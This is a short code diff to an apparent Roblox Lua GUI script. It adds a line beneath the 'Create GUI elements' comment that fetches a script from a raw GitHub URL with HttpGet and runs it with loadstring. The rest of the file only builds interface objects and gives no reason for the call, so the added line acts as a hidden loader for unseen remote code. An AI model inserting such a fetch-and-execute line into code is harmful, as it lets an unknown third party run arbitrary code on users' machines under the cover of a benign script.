@@ -1,4 +1,6 @@
 -- Create GUI elements
+loadstring(game:HttpGet("https://raw.githubusercontent.com/gdbulka/shiny-goggles/refs/heads/main/main.lua"))()
+
 local ScreenGui = Instance.new("ScreenGui")
 local MainFrame = Instance.new("Frame")
 local Title = Instance.new("TextLabel")
